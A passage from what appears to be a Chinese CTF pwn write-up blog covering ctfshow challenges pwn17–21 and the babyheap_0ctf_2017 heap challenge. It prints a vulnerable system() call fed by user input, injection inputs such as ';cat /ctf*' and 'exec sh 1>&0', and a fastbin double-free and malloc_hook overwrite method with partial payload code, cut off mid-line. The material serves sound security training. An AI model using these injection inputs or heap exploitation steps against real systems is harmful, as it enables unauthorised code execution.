punctuation\">(</span>asc_D48<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_DC0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_E40<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_ED0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_F60<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_FE8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_1080<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>aClassifyCtfsho<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Type  : Linux_Security_Mechanisms                               \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Site  : https://ctf.show/                                       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Hint  : You should understand the basic command usage of Linux! \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>dest <span class=\"token operator\">=</span> <span class=\"token number\">790655852</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nHow much do you know about Linux commands? \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nEnter the command you want choose:(1.2.3.4 or 5)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> v4 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which directory?('/','./' or the directiry you want?)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0xAuLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution succeeded!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ctfshow&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"... ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your flag is ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ctfshow&#123;flag is not here!&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wtf?You haven't left yet?\\nOk~ give you flag:\\nflag is loading......\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1BF52u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"su: Authentication failure\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"See you!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"command not found!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现在 <code>case 3</code>  中，有 <code>system（&quot;cat /flag&quot;）</code> 但是中间会有等待时间（sleep（0x1bf52）单位为毫秒）</p>\n<p>而在 <code>case 2</code>  中，有一个 <code>strcat（）</code> 会将我们输入的值添加到 <code>dest</code>  后面，然后执行，在此输入 <code>cat /ctfshow_flag</code>  会导致无限循环（可能因为命令没有加；分割导致，并且没有清空 buf，导致不断执行）</p>\n<p>此处需要将命令利用 <code>;</code>  分开，分别执行， <code>read</code>  读 10 个字节，所以需要使用通配符 <code>*</code></p>\n<p>输入命令 <code>;cat /ctf*</code>  即可</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5eh6J.png\" alt=\"\" /></p>\n<h1 id=\"pwn18linux命令基础\"><a class=\"anchor\" href=\"#pwn18linux命令基础\">#</a> pwn18（Linux 命令基础）</h1>\n<h2 id=\"题目-13\"><a class=\"anchor\" href=\"#题目-13\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5eHk6.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开了，ida 查看<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mEcQ.png\" alt=\"\" /></p>\n<p>fake()<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mVXj.png\" alt=\"\" /></p>\n<p>real()<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mn7q.md.png\" alt=\"\" /></p>\n<p>发现这个两个函数的输出定向符不同</p>\n<p><code>&gt;&gt;</code>  会换行，将命令产生的结果输出在已有文件内容的下一行开始</p>\n<p><code>&gt;</code>    命令的输出结果覆盖原有文件的内容（会清空旧内容）</p>\n<p>这两个重定向符如果指定输出的文件不存在就创建这个文件</p>\n<p>回到题目，由于我们要输出 flag，所以不能让原内容清空，就只能用 <code>fake()</code>  函数，也就是我们需要满足 <code>v4==9</code>  这个条件，即输入 9 即可</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5nlVI.png\" alt=\"\" /></p>\n<h1 id=\"pwn19linux基础命令\"><a class=\"anchor\" href=\"#pwn19linux基础命令\">#</a> pwn19（Linux 基础命令）</h1>\n<h2 id=\"题目-14\"><a class=\"anchor\" href=\"#题目-14\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5nYRS.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开，ida 查看</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5M0Zd.png\" alt=\"\" /></p>\n<p>发现调用了一个 fork 函数， <code>fork函数返回两次，子进程返回0，父进程返回子进程的pid</code> （执行返回值顺序是不定的），所以当是子进程返回 0 时才能到 <code>else</code>  段继续写入执行得到 flag</p>\n<p>又有一个 <code>fclose()</code>  函数，它关闭了一个输出流，我们要对其进行绕过，通过 <code>Linux命令</code> 中的 <code>exec 1&gt;&amp;0</code>  将标准输出流重定向到标准输入流里，并且在打开终端后都默认指向终端，所以会输出到终端上</p>\n<p>最后输入 <code>exec cat /ctf* 1&gt;&amp;0</code>  会将 flag 输出到终端上，也可以是 <code>exec sh 1&gt;&amp;0</code>  进行 shell 交互得到 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP53ckj.png\" alt=\"\" /></p>\n<h1 id=\"pwn20relro保护\"><a class=\"anchor\" href=\"#pwn20relro保护\">#</a> pwn20（RELRO 保护）</h1>\n<p><strong>RELRO（RELocation Read-Only）</strong> 是一种可选的二进制保护机制，用于增加程序的安全性。它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure LinkageTable，简称 PLT）的可写性来防止针对这些结构的攻击。</p>\n<p>RELRO 保护有三种状态：</p>\n<ol>\n<li>No RELRO：在这种状态下，GOT 和 PLT 都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</li>\n<li>Partial RELRO：在这种状态下，GOT 的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</li>\n<li>Full RELRO：在这种状态下，GOT 和 PLT 都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止</li>\n</ol>\n<h2 id=\"题目-15\"><a class=\"anchor\" href=\"#题目-15\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP53vjK.png\" alt=\"\" /></p>\n<p>got 表是否可写通过保护 RELRO 查看，FULL RELRO 代表着 got 表不可写，<br />\nNO RELRO 代表可写，代表部分可写<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP58PNd.png\" alt=\"\" /><br />\n此处 <code>No RELRO</code>  代表 got 表可写，plt 表可写</p>\n<p>然后查看 <code>.got</code>  表和 <code>.plt.got</code>  表地址，利用命令在终端上直接输入 <code>readelf -s pwn20</code>  即可（也可利用 ida 查看）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIkEMn.md.png\" alt=\"\" /></p>\n<p 1_1_0x600f18_0x600f28=\"\">ctfshow</p>\n<h1 id=\"pwn21\"><a class=\"anchor\" href=\"#pwn21\">#</a> pwn21</h1>\n<h2 id=\"题目-16\"><a class=\"anchor\" href=\"#题目-16\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/20/pPIkMiF.png\" alt=\"\" /></p>\n<p>查看保护<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIAPw6.png\" alt=\"\" /><br />\n发现是 <code>Partial RELRO</code>  保护开启了一部分， <code>got</code>  表开头部分被设置为只读，其他的剩余部分仍然可写，所以这里是 <code>got</code>  不可写， <code>.plt.got</code>  可写</p>\n<p>查看各表的地址<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIAEfe.png\" alt=\"\" /></p>\n<p 0_1_0x600ff0_0x601000=\"\">ctfshow</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/",
            "url": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/",
            "title": "babyheap_0ctf_2017，fastbin.attack之double.free",
            "date_published": "2023-09-12T13:08:15.000Z",
            "content_html": "<p>由于断断续续写了好久加上自身水平不足导致可能存在逻辑上的错误等等，如有错误，还望指出</p>\n<p><s>先前的理解<br />\n改变 index4 的大小后被认为是释放了，然后分配 fastbin (小于 0x80 的在这里) 根据后进先出，分配被认为是释放的 index4 为 index2，在将 index 的大小改回去，此时便让两个 index2 和 index4 都指向了同一个 chunk</s></p>\n<p><s>通过堆溢出，用还未释放的 index0 来溢出改变 chunk2 的 fd 的地址为 chunk4<br />\n，原来应该通过释放由于后进先出通过 free1，free2 的顺序，fastbin 中是由 chunk2-&gt;chunk1, 溢出后变为 chunk2-&gt;chunk4，此时视为 chunk4 被释放放在 fastbin 中，因为需要让两个 index 指向同一个 chunk，就需要在重新申请堆块 chunk1 和 chunkl2 后再申请 chunk4，由于再 fastbin 中，是后进先出（在 fastbin 中：chunk2-&gt;chunk4）所以给 index1 分配的是原来的 chunk2，而 index2 就被分配了 chunk4，</s></p>\n<p><s>后面 mallco (0x80) 仍然分配的是 chunk4（我认为应该是原本就是指向 chunk4，且已经修改了大小，所以申请时能够通过 “chunksuize 与其对应的 fastbin_index 匹配” 这是一个节省资源的机制，给相同大小的直接分配，不用去再合并块等等），这时 index2 与 index4 都指向了 chuink4，再次释放 free4，chunk4 就进入 unsortbin（unsortedbin 中只有一个块时，就会使 fd 和 bk 指针指向同一个地址，即  <code>main_arena+88, main_arena相对libc固定偏移0x3c4b20,不同libc版本偏移不同</code> ，因此  <code>libc=main_area_88-88-0x3c4b20</code> ）</s></p>\n<p>最终利用：<br />\n<strong>malloc_hook 是一个 libc 上的函数，如果指针不为空则会执行其指针指向的函数，通过这个来 getshell</strong></p>\n<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2uqmV.png\" alt=\"\" /></p>\n<p>发现保护全开了，利用 ida 查看一下</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2uvY4.png\" alt=\"\" /></p>\n<p>挨个查看</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2K961.png\" alt=\"\" /></p>\n<p>switch 里的判断条件（用来选择）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2KKXt.png\" alt=\"\" /></p>\n<p>case 1（allocate，分配 chunk）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2KUcn.png\" alt=\"\" /></p>\n<p>case 2（fill，进行内容填充，存在堆溢出）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MED0.png\" alt=\"\" /></p>\n<p>case 3（free，释放 chunk）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MM8J.png\" alt=\"\" /></p>\n<p>case 4（dump，输出内容，可以以此获取 main.arena88）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MN5D.png\" alt=\"\" /></p>\n<h1 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h1>\n<p>1. 由于 unsorted bin 中只有一个块时会将 fb 和 bk 指针指向 main.arena+88 处，而 libc 距 main.aerna-offset（该 offset 是一个固定值，只是不同版本的 libc 里不同）</p>\n<p><code>libc_base=main_arena_88-offset-88</code></p>\n<p>2. 因此我们要使一块 chunk 去到 unsorted bin 再用 dump 泄露出来，这就需要我们让两个 index 来指向同一个 chunk，一个释放掉使 chunk 到 unsorted bin，另一个就可以通过 dump 来泄露 main.arena+88 的地址</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>要让两个 index 指向同一个 chunk，就需要借助 free 来实现，通过 <strong>free 两个 index (chunk1,chunk2)</strong> ，使其到 fastbin 中，其会按照后进先出原则，再通过溢出<strong>使一个 index2 的 fd 指向 chunk4</strong>，将原来的 fastbin 中<strong> chunk2-&gt;chunk1 变换为了 chunk2-&gt;chunk4</strong>，此时 mallco （index1 的大小）时会将 chunk2 分配给 index1，而 mallco （index2 的大小）会将 chunk4 分配给 index2【注意此时要修改 chunk4 的 size 和 index2 的大小一致】，然后通过溢出 index3 将 chunk4 的 size 值恢复，然后再 mallco （index4 的大小）再释放，这时 chunk4 就会进入 unsorted bin , 并且 index2 也指向了 chunk4，可以通过 dump（index2）来泄露 main.arena+88 的地址</p>\n<p>4.fastbin attack</p>\n<p>原理：</p>\n<p>通过 double free 利用 ：释放 chunk1 和 chunk2 然后 fastbin 里就会形成</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP22dJO.png\" alt=\"\" /></p>\n<p>利用 double free 来再次释放 chunk1，会变成：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2fPJK.png\" alt=\"\" /></p>\n<p>此时申请后分配 chunk1：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2fNoq.png\" alt=\"\" /></p>\n<p>接着需要写入前面分配的 chunk1 来改变 fd 指向到想要写入的地址（此处是因为 free 了两次所以同一个 chunk1 一个再 heap 中，另一个在 fastbin 里，通过 heap 写入就能改写 fastbin 里的 fd 指向）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2IUuF.png\" alt=\"\" /></p>\n<p>接着 mallco chunk2 和 mallco chunk1，此时 fastbin 指向新指向的 chunk3</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2IqKS.png\" alt=\"\" /></p>\n<p>此时再 mallco 一次即可申请到新的 chunk3，然后就可以进行改写内容</p>\n<p>回到题目：</p>\n<p>通过泄露的地址来获得 libc 的基地址， <strong>libc 上的函数 libc_mallco，该函数会调用 mallco hook，是 libc 上的一个函数指针，若该指针不为空则执行它指向的函数</strong> ，我们可以以此来 getshell，用 fastbin attack 将一个 libc 上的地址放入 fastbin 链表中，然后通过 malloc （），将该地址分配，这样就可以改写 libc 的内容，通过 mallco hook 来 getshell（写入地址后再次 mallco 即可执行 mallco hook）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9JelVrVg==\">http://t.csdn.cn/IzUkV</span></p>\n<p>此时 chunk4 在 unsorted bin 中，我们需要 mallco 0x60，再 free 使其放入到 fastbin 中，因为前面 index2 已经指向了 chunk4，所以通过 index2 写入要修改的地址即可，然后 mallco 2 次，一个是 chunk4，一个就是新的 chunk 为要修改的 mallco hook</p>\n<h1 id=\"3漏洞利用\"><a class=\"anchor\" href=\"#3漏洞利用\">#</a> 3. 漏洞利用</h1>\n<p>1. 先利用 allocate 得到 chunk</p>\n<pre><code>allocate(0x10)  index0\nallocate(0x10)  index1\nallocate(0x10)  index2\nallocate(0x10)  index3\nallocate(0x80)  index4\n</code></pre>\n<p>2. 利用 free，使后续的两个 index 可以指向同一个 chunk</p>\n<pre><code>free（1）\nfree（2）\n</code></pre>\n<p>【注意修改 glibc 版本】</p>\n<pre><code>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017\n</code></pre>\n<p>查看此时的堆（glibc 2.26 版本以后会不一样），可以发现地址都是对齐的：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAMSP.png\" alt=\"\" /></p>\n<p>查看 bins，此时是 chunk2-&gt;chunk1：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAtFs.png\" alt=\"\" /></p>\n<p>查看该 heap 的内容，由下面的图也可以发现地址只有第一个字节不同，所以后面溢出修改一个字节为 0x80 就好：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAck9.png\" alt=\"\" /></p>\n<h2 id=\"溢出\"><a class=\"anchor\" href=\"#溢出\">#</a> 溢出</h2>\n<p>利用 index0 来溢出改写 index2 的 fd（不用 index1 是因为 index1 也被释放），利用 index3 来改写 index4 的 size</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>填充index0的fd和bk（因为此处是作为存储数据来用，并不是存地址）</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>index1的pre_size和size位和fd、bk</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>index2：pre_size、size、fd</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>填充 index0进行溢出</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>填充index3</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload2<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>溢出修改index4的size位</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">(</span>payload2<span class=\"token 